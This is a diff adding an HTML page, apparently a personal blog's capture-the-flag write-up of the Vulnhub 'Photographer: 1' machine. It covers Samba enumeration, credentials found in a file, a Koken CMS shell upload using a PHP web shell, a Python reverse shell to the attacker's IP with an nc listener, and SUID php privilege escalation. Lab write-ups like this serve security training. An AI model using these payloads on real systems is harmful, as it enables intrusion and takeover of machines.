@@ -1,0 +1,243 @@
+<HTML>
+<HEAD>
+<!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+
+<title>Alienum</title>
+<style>
+* {
+  box-sizing: border-box;
+}
+
+body{
+background-color: rgba(0, 0, 0, 0.9);
+width: 95%;
+}
+
+li a, p, h1, h2{
+color:#808080;
+}
+
+.tools h1 ,h2{
+ padding-left: 50px;
+ font-size: 20px;
+}
+
+.tools img{
+ left: 5%;
+ position: relative;
+}
+
+.btn-circle {
+  height: 47px;
+  width: 47px;
+  padding: 6px 0px;
+  font-size: 18px;
+  line-height: 1.33;
+  border-radius: 25px;
+}
+
+.footer{
+  position: relative;
+  bottom:0;
+}
+
+.social{
+ position: relative; 
+ bottom:0;
+ left: 20px;
+}
+
+header{
+text-align:center;
+}
+<!------------------menu-------------------->
+.topnav {
+  overflow: hidden;
+  background-color: #333;
+}
+.topnav a {
+  float: left;
+  display: block;
+  color: #f2f2f2;
+  text-align: center;
+  padding: 14px 16px;
+  text-decoration: none;
+  font-size: 17px;
+}
+.topnav .icon {
+  display: none;
+}
+.topnav a:hover{
+  background-color: #555;
+  color: white;
+}
+
+.gallery img {
+  position: relative;
+  float:center;
+  background-attachment: fixed;  
+  box-shadow: 0 4px 8px 0 rgba(99, 173, 118, 0.2), 0 6px 20px 0 rgba(99, 173, 118, 0.9);
+  left: 5%;
+}
+
+.desc {
+  padding: 15px;
+  font-size: 20px;
+  color:#808080;
+  text-align: left;
+}
+
+pre {
+	background: rgba(0, 0, 0, 0.9);
+	border: 10px outset rgba(27, 27, 30, 1);
+	padding: 10px;
+	font-size: 16px;
+	color: #aa759f;
+	border-radius: 2px;
+	text-wrap: normal;
+	overflow: auto;
+	overflow-y: hidden;
+}
+
+
+  </style>
+	</HEAD>
+	<BODY>		
+		<nav class="navbar navbar-expand-lg">
+			<div class="topnav" id="myTopnav">
+				<a class="nav-link" href="../../index.html">Home <span class="sr-only">(current)</span></a>
+				<a class="nav-link" href="../../tools.html">Tools</a>
+				<a class="nav-link" href="../../vulnhub.html">Vulnhub</a>
+				<a class="nav-link" href="../../about.html">About</a>
+				<a href="javascript:void(0);" style="font-size:15px;" class="icon" onclick="myFunction()">&#9776;</a>
+			</div>					
+		</nav>
+		
+         <header>
+		  <h1>Photographer: 1, Vulnhub Writeup</h1>
+		  <p>Posted by Alienum</p>
+		</header> 
+		
+		<div class="gallery">
+		  <p>
+		   <div class="desc">Port Scan</div>
+		    <img src="source/1.PNG" style="width:500px; height: 500px;"> 
+		   </p>
+		   <p>
+		    <div class="desc">Samba</div>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -L $IP
+smbclient //$IP/sambashare
+get mailsent.txt
+get wordpress.bkp.zip</code></pre></div></div>
+			<br>
+		    <img src="source/2.PNG" style="width:520px; height: 350px;"> 
+		   </p>
+		  <p>
+		    <div class="desc">Read the mailsent.txt</div><br>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username : daisa
+password : babygirl</code></pre></div></div>
+		    <img src="source/3.PNG" style="width:600px; height: 360px;"> 
+		   </p>
+		    <p>
+		    <div class="desc">Directory scan</div>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dirb http://$TARGET:8000 -f</code></pre></div></div>
+		    <img src="source/5.PNG" style="width:500px; height: 50px;"><br><br>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Found /admin/</code></pre></div></div>
+		    <img src="source/51.PNG" style="width:600px; height: 100px;"><br>
+		   </p>
+		 <p>
+		    <div class="desc">Login </div>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>email : daisa@photographer.com
+password : babygirl</code></pre></div></div><br>
+		    <img src="source/6.PNG" ><br>
+		  </p>
+		  <p>
+		    <div class="desc">Search for Koken 0.22.24 vulnerability</div>
+		    <img src="source/7.PNG" style="width:450px; height: 320px;"><br><br>
+		    <div class="desc">Found : Koken CMS 0.22.24 Shell Upload</div>
+		    <img src="source/8.PNG" style="width:600px; height: 500px;"><br><br>
+		    <div class="desc">Create malicious jpg file</div>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>system($_GET['cmd']);</code></pre></div></div>
+		    <img src="source/9.PNG" style="width:400px; height: 200px;"><br><br>
+		    <div class="desc">Upload the image.php.jpg</div>
+		    <img src="source/10.PNG" style="width:600px; height: 450px;"><br><br>
+			<div class="desc">Use Burpsuite to change the image.php.jpg => image.php</div>
+		    <img src="source/11.PNG" style="width:600px; height: 600px;"><br><br>
+			<div class="desc">Move the cursor on the "Download File" to see the original path of the image.php</div>
+		    <img src="source/12.PNG" style="width:600px; height: 450px;">
+			<br><br>
+			</p>
+			<p>
+		    <div class="desc">Reverse shell | We are able to execute commands.</div>
+		    <img src="source/13.PNG" style="width:800px; height: 320px;"><br><br>
+		    <div class="desc">Python reverse shell</div>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><div class="desc">|Target machine|</div>image.php?cmd= python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("YOUR IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+            <div class="desc">|Your machine|</div>nc -lvp 4444</code></pre></div></div>
+			<br>
+		    <img src="source/14.PNG" style="width:800px; height: 400px;"><br><br>
+		    <div class="desc">Found the user.txt</div>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight">cd /home/daisa/
+cat user.txt</code></pre></div></div><br>
+		    <img src="source/15.PNG" style="width:600px; height: 300px;"><br><br>
+			</p>
+			<p>
+		    <div class="desc">Root Privilege Escalation</div>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -u=s -type f 2>/dev/null</code></pre></div></div>
+			<div class="desc">I found the suspicious /usr/bin/php7.2</div>
+		    <img src="source/16.PNG" style="width:400px; height: 360px;"> <br><br>
+			<div class="desc">Let's search for GTFOBins php</div>
+			<img src="source/161.PNG" style="width:600px; height: 300px;"><br><br>
+			<div class="desc">We found the SUID exploit, i will use the full path for php7.2</div>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight">
+CMD="/bin/sh"
+/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"</code></pre></div></div><br>
+		    <img src="source/17.PNG" style="width:600px; height: 600px;"> 
+			<br><br>
+			<h2>Rooted</h2>
+		   </p>
+		</div> 
+		
+		<footer>
+			<div class="social">
+				<a  href="https://github.com/alienaki">
+				<img class="btn btn-circle" src="../../src/github.jpg" >
+				</a>
+				<a  href="https://twitter.com/AL1ENUM">
+				<img  class="btn btn-circle" src="../../src/twitter.jpg" >
+				</a>
+				<a  href="https://www.hackthebox.eu/profile/314167">
+				<img  class="btn btn-circle" src="../../src/htb.jpg" >
+				</a>
+				<a  href="https://tryhackme.com/p/aeriko">
+				<img  class="btn btn-circle" src="../../src/THM.png" >
+				</a>
+				<br/>
+			</div>				
+		<footer>
+		
+		<script>
+			function myFunction() {
+			  var x = document.getElementById("myTopnav");
+			  if (x.className === "topnav") {
+				x.className += " responsive";
+			  } else {
+				x.className = "topnav";
+			  }
+			}
+		</script>
+	
+	<!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+	</BODY>
+</HTML>
